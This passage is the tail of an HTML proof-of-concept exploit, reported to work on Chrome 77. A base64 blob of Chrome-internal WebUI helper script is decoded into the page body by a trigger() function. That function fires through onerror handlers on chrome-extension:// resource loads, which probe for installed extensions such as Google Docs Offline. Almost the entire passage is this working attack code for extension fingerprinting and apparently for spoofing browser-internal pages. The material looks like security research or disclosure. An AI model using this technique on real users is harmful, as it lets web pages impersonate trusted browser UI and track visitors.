iAgICAgIGRlbGV0ZSB3ZWJVSUxpc3RlbmVyTWFwW2xpc3RlbmVyLmV2ZW50TmFtZV1bbGlzdGVuZXIudWlkXTsNCiAgICAgIHJldHVybiB0cnVlOw0KICAgIH0NCiAgICByZXR1cm4gZmFsc2U7DQogIH0NCg0KICByZXR1cm4gew0KICAgIGFkZFNpbmdsZXRvbkdldHRlcjogYWRkU2luZ2xldG9uR2V0dGVyLA0KICAgIGRlZmluZTogZGVmaW5lLA0KICAgIGRlZmluZVByb3BlcnR5OiBkZWZpbmVQcm9wZXJ0eSwNCiAgICBkaXNwYXRjaFByb3BlcnR5Q2hhbmdlOiBkaXNwYXRjaFByb3BlcnR5Q2hhbmdlLA0KICAgIGRpc3BhdGNoU2ltcGxlRXZlbnQ6IGRpc3BhdGNoU2ltcGxlRXZlbnQsDQogICAgZXhwb3J0UGF0aDogZXhwb3J0UGF0aCwNCiAgICBQcm9wZXJ0eUtpbmQ6IFByb3BlcnR5S2luZCwNCg0KICAgIGFkZFdlYlVJTGlzdGVuZXI6IGFkZFdlYlVJTGlzdGVuZXIsDQogICAgcmVtb3ZlV2ViVUlMaXN0ZW5lcjogcmVtb3ZlV2ViVUlMaXN0ZW5lciwNCiAgICBzZW5kV2l0aFByb21pc2U6IHNlbmRXaXRoUHJvbWlzZSwNCiAgICB3ZWJVSUxpc3RlbmVyQ2FsbGJhY2s6IHdlYlVJTGlzdGVuZXJDYWxsYmFjaywNCiAgICB3ZWJVSVJlc3BvbnNlOiB3ZWJVSVJlc3BvbnNlLA0KDQogICAgZ2V0IGRvYygpIHsNCiAgICAgIHJldHVybiBkb2N1bWVudDsNCiAgICB9LA0KDQogICAgZ2V0IGlzTWFjKCkgew0KICAgICAgcmV0dXJuIC9NYWMvLnRlc3QobmF2aWdhdG9yLnBsYXRmb3JtKTsNCiAgICB9LA0KDQogICAgZ2V0IGlzV2luZG93cygpIHsNCiAgICAgIHJldHVybiAvV2luLy50ZXN0KG5hdmlnYXRvci5wbGF0Zm9ybSk7DQogICAgfSwNCiAgICBnZXQgaXNDaHJvbWVPUygpIHsNCiAgICAgIHJldHVybiAvQ3JPUy8udGVzdChuYXZpZ2F0b3IudXNlckFnZW50KTsNCiAgICB9LA0KDQogICAgZ2V0IGlzTGludXgoKSB7DQogICAgICByZXR1cm4gL0xpbnV4Ly50ZXN0KG5hdmlnYXRvci51c2VyQWdlbnQpOw0KICAgIH0sDQoNCiAgICBnZXQgaXNBbmRyb2lkKCkgew0KICAgICAgcmV0dXJuIC9BbmRyb2lkLy50ZXN0KG5hdmlnYXRvci51c2VyQWdlbnQpOw0KICAgIH0sDQoNCiAgICBnZXQgaXNJT1MoKSB7DQogICAgICByZXR1cm4gL2lQYWR8aVBob25lfGlQb2QvLnRlc3QobmF2aWdhdG9yLnBsYXRmb3JtKTsNCiAgICB9DQogIH07DQp9KHRoaXMpOw0KPC9zY3JpcHQ+DQo8c2NyaXB0Pg0KDQovKiAjZXhwb3J0ICovIGZ1bmN0aW9uIGFzc2VydChjb25kaXRpb24sIG9wdF9tZXNzYWdlKSB7DQogIGlmICghY29uZGl0aW9uKSB7DQogICAgbGV0IG1lc3NhZ2UgPSAnQXNzZXJ0aW9uIGZhaWxlZCc7DQogICAgaWYgKG9wdF9tZXNzYWdlKSB7DQogICAgICBtZXNzYWdlID0gbWVzc2FnZSArICc6ICcgKyBvcHRfbWVzc2FnZTsNCiAgICB9DQogICAgY29uc3QgZXJyb3IgPSBuZXcgRXJyb3IobWVzc2FnZSk7DQogICAgY29uc3QgZ2xvYmFsID0gZnVuY3Rpb24oKSB7DQogICAgICBjb25zdCB0aGlzT3JTZWxmID0gdGhpcyB8fCBzZWxmOw0KICAgICAgLyoqIEB0eXBlIHtib29sZWFufSAqLw0KICAgICAgdGhpc09yU2VsZi50cmFjZUFzc2VydGlvbnNGb3JUZXN0aW5nOw0KICAgICAgcmV0dXJuIHRoaXNPclNlbGY7DQogICAgfSgpOw0KICAgIGlmIChnbG9iYWwudHJhY2VBc3NlcnRpb25zRm9yVGVzdGluZykgew0KICAgICAgY29uc29sZS53YXJuKGVycm9yLnN0YWNrKTsNCiAgICB9DQogICAgdGhyb3cgZXJyb3I7DQogIH0NCiAgcmV0dXJuIGNvbmRpdGlvbjsNCn0NCg0KDQovKiAjZXhwb3J0ICovIGZ1bmN0aW9uIGFzc2VydE5vdFJlYWNoZWQob3B0X21lc3NhZ2UpIHsNCiAgYXNzZXJ0KGZhbHNlLCBvcHRfbWVzc2FnZSB8fCAnVW5yZWFjaGFibGUgY29kZSBoaXQnKTsNCn0NCg0KLyogI2V4cG9ydCAqLyBmdW5jdGlvbiBhc3NlcnRJbnN0YW5jZW9mKHZhbHVlLCB0eXBlLCBvcHRfbWVzc2FnZSkgew0KDQogIGlmICghKHZhbHVlIGluc3RhbmNlb2YgdHlwZSkpIHsNCiAgICBhc3NlcnROb3RSZWFjaGVkKA0KICAgICAgICBvcHRfbWVzc2FnZSB8fA0KICAgICAgICAnVmFsdWUgJyArIHZhbHVlICsgJyBpcyBub3QgYVtuXSAnICsgKHR5cGUubmFtZSB8fCB0eXBlb2YgdHlwZSkpOw0KICB9DQogIHJldHVybiB2YWx1ZTsNCn0NCg0KLyogI2V4cG9ydCAqLyBmdW5jdGlvbiAkKGlkKSB7DQogIGNvbnN0IGVsID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoaWQpOw0KICByZXR1cm4gZWwgPyBhc3NlcnRJbnN0YW5jZW9mKGVsLCBIVE1MRWxlbWVudCkgOiBudWxsOw0KfQ0KDQovKiAjZXhwb3J0ICovIGZ1bmN0aW9uIGdldFNWR0VsZW1lbnQoaWQpIHsNCiAgY29uc3QgZWwgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZChpZCk7DQogIHJldHVybiBlbCA/IGFzc2VydEluc3RhbmNlb2YoZWwsIEVsZW1lbnQpIDogbnVsbDsNCn0NCi8qICNleHBvcnQgKi8gZnVuY3Rpb24gZ2V0RGVlcEFjdGl2ZUVsZW1lbnQoKSB7DQogIGxldCBhID0gZG9jdW1lbnQuYWN0aXZlRWxlbWVudDsNCiAgd2hpbGUgKGEgJiYgYS5zaGFkb3dSb290ICYmIGEuc2hhZG93Um9vdC5hY3RpdmVFbGVtZW50KSB7DQogICAgYSA9IGEuc2hhZG93Um9vdC5hY3RpdmVFbGVtZW50Ow0KICB9DQogIHJldHVybiBhOw0KfQ0KDQovKiAjZXhwb3J0ICovIGZ1bmN0aW9uIHBhcnNlUXVlcnlQYXJhbXMobG9jYXRpb24pIHsNCiAgY29uc3QgcGFyYW1zID0ge307DQogIGNvbnN0IHF1ZXJ5ID0gdW5lc2NhcGUobG9jYXRpb24uc2VhcmNoLnN1YnN0cmluZygxKSk7DQogIGNvbnN0IHZhcnMgPSBxdWVyeS5zcGxpdCgnJicpOw0KICBmb3IgKGxldCBpID0gMDsgaSA8IHZhcnMubGVuZ3RoOyBpKyspIHsNCiAgICBjb25zdCBwYWlyID0gdmFyc1tpXS5zcGxpdCgnPScpOw0KICAgIHBhcmFtc1twYWlyWzBdXSA9IHBhaXJbMV07DQogIH0NCiAgcmV0dXJuIHBhcmFtczsNCn0NCg0KLyogI2V4cG9ydCAqLyBmdW5jdGlvbiBzZXRRdWVyeVBhcmFtKGxvY2F0aW9uLCBrZXksIHZhbHVlKSB7DQogIGNvbnN0IHF1ZXJ5ID0gcGFyc2VRdWVyeVBhcmFtcyhsb2NhdGlvbik7DQogIHF1ZXJ5W2VuY29kZVVSSUNvbXBvbmVudChrZXkpXSA9IGVuY29kZVVSSUNvbXBvbmVudCh2YWx1ZSk7DQoNCiAgbGV0IG5ld1F1ZXJ5ID0gJyc7DQogIGZvciAoY29uc3QgcSBpbiBxdWVyeSkgew0KICAgIG5ld1F1ZXJ5ICs9IChuZXdRdWVyeSA/ICcmJyA6ICc/JykgKyBxICsgJz0nICsgcXVlcnlbcV07DQogIH0NCg0KICByZXR1cm4gbG9jYXRpb24ub3JpZ2luICsgbG9jYXRpb24ucGF0aG5hbWUgKyBuZXdRdWVyeSArIGxvY2F0aW9uLmhhc2g7DQp9DQoNCi8qICNleHBvcnQgKi8gZnVuY3Rpb24gZmluZEFuY2VzdG9yQnlDbGFzcyhlbCwgY2xhc3NOYW1lKSB7DQogIHJldHVybiAvKiogQHR5cGUge0VsZW1lbnR9ICovIChmaW5kQW5jZXN0b3IoZWwsIGZ1bmN0aW9uKGVsKSB7DQogICAgcmV0dXJuIGVsLmNsYXNzTGlzdCAmJiBlbC5jbGFzc0xpc3QuY29udGFpbnMoY2xhc3NOYW1lKTsNCiAgfSkpOw0KfQ0KDQovKiAjZXhwb3J0ICovIGZ1bmN0aW9uIGZpbmRBbmNlc3Rvcihub2RlLCBwcmVkaWNhdGUpIHsNCiAgbGV0IGxhc3QgPSBmYWxzZTsNCiAgd2hpbGUgKG5vZGUgIT0gbnVsbCAmJiAhKGxhc3QgPSBwcmVkaWNhdGUobm9kZSkpKSB7DQogICAgbm9kZSA9IG5vZGUucGFyZW50Tm9kZTsNCiAgfQ0KICByZXR1cm4gbGFzdCA/IG5vZGUgOiBudWxsOw0KfQ0KLyogI2V4cG9ydCAqLyBmdW5jdGlvbiBkaXNhYmxlVGV4dFNlbGVjdEFuZERyYWcoDQogICAgb3B0X2FsbG93U2VsZWN0U3RhcnQsIG9wdF9hbGxvd0RyYWdTdGFydCkgew0KICBkb2N1bWVudC5vbnNlbGVjdHN0YXJ0ID0gZnVuY3Rpb24oZSkgew0KICAgIGlmICghKG9wdF9hbGxvd1NlbGVjdFN0YXJ0ICYmIG9wdF9hbGxvd1NlbGVjdFN0YXJ0LmNhbGwodGhpcywgZSkpKSB7DQogICAgICBlLnByZXZlbnREZWZhdWx0KCk7DQogICAgfQ0KICB9Ow0KICBkb2N1bWVudC5vbmRyYWdzdGFydCA9IGZ1bmN0aW9uKGUpIHsNCiAgICBpZiAoIShvcHRfYWxsb3dEcmFnU3RhcnQgJiYgb3B0X2FsbG93RHJhZ1N0YXJ0LmNhbGwodGhpcywgZSkpKSB7DQogICAgICBlLnByZXZlbnREZWZhdWx0KCk7DQogICAgfQ0KICB9Ow0KfQ0KLyogI2V4cG9ydCAqLyBmdW5jdGlvbiBpc1JUTCgpIHsNCiAgcmV0dXJuIGRvY3VtZW50LmRvY3VtZW50RWxlbWVudC5kaXIgPT0gJ3J0bCc7DQp9DQoNCi8qICNleHBvcnQgKi8gZnVuY3Rpb24gZ2V0UmVxdWlyZWRFbGVtZW50KGlkKSB7DQogIHJldHVybiBhc3NlcnRJbnN0YW5jZW9mKA0KICAgICAgJChpZCksIEhUTUxFbGVtZW50LCAnTWlzc2luZyByZXF1aXJlZCBlbGVtZW50OiAnICsgaWQpOw0KfQ0KDQovKiAjZXhwb3J0ICovIGZ1bmN0aW9uIHF1ZXJ5UmVxdWlyZWRFbGVtZW50KHNlbGVjdG9ycywgb3B0X2NvbnRleHQpIHsNCiAgY29uc3QgZWxlbWVudCA9IChvcHRfY29udGV4dCB8fCBkb2N1bWVudCkucXVlcnlTZWxlY3RvcihzZWxlY3RvcnMpOw0KICByZXR1cm4gYXNzZXJ0SW5zdGFuY2VvZigNCiAgICAgIGVsZW1lbnQsIEhUTUxFbGVtZW50LCAnTWlzc2luZyByZXF1aXJlZCBlbGVtZW50OiAnICsgc2VsZWN0b3JzKTsNCn0NCg0KWydjbGljaycsICdhdXhjbGljayddLmZvckVhY2goZnVuY3Rpb24oZXZlbnROYW1lKSB7DQogIGRvY3VtZW50LmFkZEV2ZW50TGlzdGVuZXIoZXZlbnROYW1lLCBmdW5jdGlvbihlKSB7DQogICAgaWYgKGUuYnV0dG9uID4gMSkgew0KICAgICAgcmV0dXJuOw0KICAgIH0gDQogICAgaWYgKGUuZGVmYXVsdFByZXZlbnRlZCkgew0KICAgICAgcmV0dXJuOw0KICAgIH0NCg0KICAgIGNvbnN0IGV2ZW50UGF0aCA9IGUucGF0aDsNCiAgICBsZXQgYW5jaG9yID0gbnVsbDsNCiAgICBpZiAoZXZlbnRQYXRoKSB7DQogICAgICBmb3IgKGxldCBpID0gMDsgaSA8IGV2ZW50UGF0aC5sZW5ndGg7IGkrKykgew0KICAgICAgICBjb25zdCBlbGVtZW50ID0gZXZlbnRQYXRoW2ldOw0KICAgICAgICBpZiAoZWxlbWVudC50YWdOYW1lID09PSAnQScgJiYgZWxlbWVudC5ocmVmKSB7DQogICAgICAgICAgYW5jaG9yID0gZWxlbWVudDsNCiAgICAgICAgICBicmVhazsNCiAgICAgICAgfQ0KICAgICAgfQ0KICAgIH0NCg0KICAgIGxldCBlbCA9IGUudGFyZ2V0Ow0KICAgIGlmICghYW5jaG9yICYmIGVsLm5vZGVUeXBlID09IE5vZGUuRUxFTUVOVF9OT0RFICYmDQogICAgICAgIGVsLndlYmtpdE1hdGNoZXNTZWxlY3RvcignQSwgQSAqJykpIHsNCiAgICAgIHdoaWxlIChlbC50YWdOYW1lICE9ICdBJykgew0KICAgICAgICBlbCA9IGVsLnBhcmVudEVsZW1lbnQ7DQogICAgICB9DQogICAgICBhbmNob3IgPSBlbDsNCiAgICB9DQoNCiAgICBpZiAoIWFuY2hvcikgew0KICAgICAgcmV0dXJuOw0KICAgIH0NCg0KICAgIGFuY2hvciA9IChhbmNob3IpOw0KICAgIGlmICgoYW5jaG9yLnByb3RvY29sID09ICdmaWxlOicgfHwgYW5jaG9yLnByb3RvY29sID09ICdhYm91dDonKSAmJg0KICAgICAgICAoZS5idXR0b24gPT0gMCB8fCBlLmJ1dHRvbiA9PSAxKSkgew0KICAgICAgY2hyb21lLnNlbmQoJ25hdmlnYXRlVG9VcmwnLCBbDQogICAgICAgIGFuY2hvci5ocmVmLCBhbmNob3IudGFyZ2V0LCBlLmJ1dHRvbiwgZS5hbHRLZXksIGUuY3RybEtleSwgZS5tZXRhS2V5LA0KICAgICAgICBlLnNoaWZ0S2V5DQogICAgICBdKTsNCiAgICAgIGUucHJldmVudERlZmF1bHQoKTsNCiAgICB9DQogIH0pOw0KfSk7DQoNCi8qICNleHBvcnQgKi8gZnVuY3Rpb24gYXBwZW5kUGFyYW0odXJsLCBrZXksIHZhbHVlKSB7DQogIGNvbnN0IHBhcmFtID0gZW5jb2RlVVJJQ29tcG9uZW50KGtleSkgKyAnPScgKyBlbmNvZGVVUklDb21wb25lbnQodmFsdWUpOw0KDQogIGlmICh1cmwuaW5kZXhPZignPycpID09IC0xKSB7DQogICAgcmV0dXJuIHVybCArICc/JyArIHBhcmFtOw0KICB9DQogIHJldHVybiB1cmwgKyAnJicgKyBwYXJhbTsNCn0NCg0KLyogI2V4cG9ydCAqLyBmdW5jdGlvbiBjcmVhdGVFbGVtZW50V2l0aENsYXNzTmFtZSh0eXBlLCBjbGFzc05hbWUpIHsNCiAgY29uc3QgZWxtID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCh0eXBlKTsNCiAgZWxtLmNsYXNzTmFtZSA9IGNsYXNzTmFtZTsNCiAgcmV0dXJuIGVsbTsNCn0NCg0KLyogI2V4cG9ydCAqLyBmdW5jdGlvbiBlbnN1cmVUcmFuc2l0aW9uRW5kRXZlbnQoZWwsIG9wdF90aW1lT3V0KSB7DQogIGlmIChvcHRfdGltZU91dCA9PT0gdW5kZWZpbmVkKSB7DQogICAgY29uc3Qgc3R5bGUgPSBnZXRDb21wdXRlZFN0eWxlKGVsKTsNCiAgICBvcHRfdGltZU91dCA9IHBhcnNlRmxvYXQoc3R5bGUudHJhbnNpdGlvbkR1cmF0aW9uKSAqIDEwMDA7DQogICAgb3B0X3RpbWVPdXQgKz0gNTA7DQogIH0NCg0KICBsZXQgZmlyZWQgPSBmYWxzZTsNCiAgZWwuYWRkRXZlbnRMaXN0ZW5lcigndHJhbnNpdGlvbmVuZCcsIGZ1bmN0aW9uIGYoZSkgew0KICAgIGVsLnJlbW92ZUV2ZW50TGlzdGVuZXIoJ3RyYW5zaXRpb25lbmQnLCBmKTsNCiAgICBmaXJlZCA9IHRydWU7DQogIH0pOw0KICB3aW5kb3cuc2V0VGltZW91dChmdW5jdGlvbigpIHsNCiAgICBpZiAoIWZpcmVkKSB7DQogICAgICBjci5kaXNwYXRjaFNpbXBsZUV2ZW50KGVsLCAndHJhbnNpdGlvbmVuZCcsIHRydWUpOw0KICAgIH0NCiAgfSwgb3B0X3RpbWVPdXQpOw0KfQ0KLyogI2V4cG9ydCAqLyBmdW5jdGlvbiBzY3JvbGxUb3BGb3JEb2N1bWVudChkb2MpIHsNCiAgcmV0dXJuIGRvYy5kb2N1bWVudEVsZW1lbnQuc2Nyb2xsVG9wIHx8IGRvYy5ib2R5LnNjcm9sbFRvcDsNCn0NCg0KLyogI2V4cG9ydCAqLyBmdW5jdGlvbiBzZXRTY3JvbGxUb3BGb3JEb2N1bWVudChkb2MsIHZhbHVlKSB7DQogIGRvYy5kb2N1bWVudEVsZW1lbnQuc2Nyb2xsVG9wID0gZG9jLmJvZHkuc2Nyb2xsVG9wID0gdmFsdWU7DQp9DQoNCi8qICNleHBvcnQgKi8gZnVuY3Rpb24gc2Nyb2xsTGVmdEZvckRvY3VtZW50KGRvYykgew0KICByZXR1cm4gZG9jLmRvY3VtZW50RWxlbWVudC5zY3JvbGxMZWZ0IHx8IGRvYy5ib2R5LnNjcm9sbExlZnQ7DQp9DQoNCi8qICNleHBvcnQgKi8gZnVuY3Rpb24gc2V0U2Nyb2xsTGVmdEZvckRvY3VtZW50KGRvYywgdmFsdWUpIHsNCiAgZG9jLmRvY3VtZW50RWxlbWVudC5zY3JvbGxMZWZ0ID0gZG9jLmJvZHkuc2Nyb2xsTGVmdCA9IHZhbHVlOw0KfQ0KDQovKiAjZXhwb3J0ICovIGZ1bmN0aW9uIEhUTUxFc2NhcGUob3JpZ2luYWwpIHsNCiAgcmV0dXJuIG9yaWdpbmFsLnJlcGxhY2UoLyYvZywgJyZhbXA7JykNCiAgICAgIC5yZXBsYWNlKC88L2csICcmbHQ7JykNCiAgICAgIC5yZXBsYWNlKC8+L2csICcmZ3Q7JykNCiAgICAgIC5yZXBsYWNlKC8iL2csICcmcXVvdDsnKQ0KICAgICAgLnJlcGxhY2UoLycvZywgJyYjMzk7Jyk7DQp9DQoNCi8qICNleHBvcnQgKi8gZnVuY3Rpb24gZWxpZGUob3JpZ2luYWwsIG1heExlbmd0aCkgew0KICBpZiAob3JpZ2luYWwubGVuZ3RoIDw9IG1heExlbmd0aCkgew0KICAgIHJldHVybiBvcmlnaW5hbDsNCiAgfQ0KICByZXR1cm4gb3JpZ2luYWwuc3Vic3RyaW5nKDAsIG1heExlbmd0aCAtIDEpICsgJ1x1MjAyNic7DQp9DQoNCi8qICNleHBvcnQgKi8gZnVuY3Rpb24gcXVvdGVTdHJpbmcoc3RyKSB7DQogIHJldHVybiBzdHIucmVwbGFjZSgvKFtcXFwuXCtcKlw/XFtcXlxdXCRcKFwpXHtcfVw9XCFcPFw+XHxcOl0pL2csICdcXCQxJyk7DQp9DQoNCi8qICNleHBvcnQgKi8gZnVuY3Rpb24gbGlzdGVuT25jZSh0YXJnZXQsIGV2ZW50TmFtZXMsIGNhbGxiYWNrKSB7DQogIGlmICghQXJyYXkuaXNBcnJheShldmVudE5hbWVzKSkgew0KICAgIGV2ZW50TmFtZXMgPSBldmVudE5hbWVzLnNwbGl0KC8gKy8pOw0KICB9DQoNCiAgY29uc3QgcmVtb3ZlQWxsQW5kQ2FsbENhbGxiYWNrID0gZnVuY3Rpb24oZXZlbnQpIHsNCiAgICBldmVudE5hbWVzLmZvckVhY2goZnVuY3Rpb24oZXZlbnROYW1lKSB7DQogICAgICB0YXJnZXQucmVtb3ZlRXZlbnRMaXN0ZW5lcihldmVudE5hbWUsIHJlbW92ZUFsbEFuZENhbGxDYWxsYmFjaywgZmFsc2UpOw0KICAgIH0pOw0KICAgIHJldHVybiBjYWxsYmFjayhldmVudCk7DQogIH07DQoNCiAgZXZlbnROYW1lcy5mb3JFYWNoKGZ1bmN0aW9uKGV2ZW50TmFtZSkgew0KICAgIHRhcmdldC5hZGRFdmVudExpc3RlbmVyKGV2ZW50TmFtZSwgcmVtb3ZlQWxsQW5kQ2FsbENhbGxiYWNrLCBmYWxzZSk7DQogIH0pOw0KfQ0KDQovKiAjZXhwb3J0ICovIGZ1bmN0aW9uIGhhc0tleU1vZGlmaWVycyhlKSB7DQogIHJldHVybiAhIShlLmFsdEtleSB8fCBlLmN0cmxLZXkgfHwgZS5tZXRhS2V5IHx8IGUuc2hpZnRLZXkpOw0KfQ0KDQpmdW5jdGlvbiBpc1RleHRJbnB1dEVsZW1lbnQoZWwpIHsNCiAgcmV0dXJuIGVsLnRhZ05hbWUgPT0gJ0lOUFVUJyB8fCBlbC50YWdOYW1lID09ICdURVhUQVJFQSc7DQp9DQo8L3NjcmlwdD4NCjwvYm9keT4NCjwvaHRtbD4="; // base64 encoded html content
	x=document.body.innerHTML=atob(content);
}
</script>
<!-- Using Google Docs Offline Extension -->
<script src="chrome-extension://ghbmnnjooekpmoecnnnilnnbdlolhkhi/page_embed_script.js" onerror="trigger();"></script>
<!-- Using Chrome Media Router (Chromecast™) Extension
<script src="chrome-extension://pkedcjkdefgpdelpbcmbmeomcjbeemfm/cast_sender.js" onerror="trigger();"></script>
<script src="chrome-extension://pkedcjkdefgpdelpbcmbmeomcjbeemfm/cast_setup/cast_app.js" onerror="trigger();"></script>
<img src="chrome-extension://pkedcjkdefgpdelpbcmbmeomcjbeemfm/cast_setup/chromecast_logo_grey.png" onerror="trigger();">
-->
</body>
</html>

<!-- Proof-of-concept (POC) works on latest version 77.0.3865.90 (Official Build) (64-bit) -->